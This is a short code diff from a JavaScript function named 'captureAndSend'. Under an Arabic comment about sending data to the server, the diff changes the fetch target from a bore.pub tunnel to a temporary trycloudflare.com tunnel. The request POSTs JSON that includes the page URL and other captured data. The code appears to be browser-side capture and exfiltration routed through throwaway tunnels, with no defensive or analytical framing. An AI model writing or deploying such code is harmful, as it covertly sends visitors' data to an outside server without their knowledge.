@@ -131,7 +131,7 @@ async function captureAndSend() {
         const pageUrl = window.location.href;
 
         // 6. إرسال البيانات إلى السيرفر
-        const response = await fetch('http://bore.pub:54270/upload', {
+        const response = await fetch('https://came-constant-thread-paintings.trycloudflare.com', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
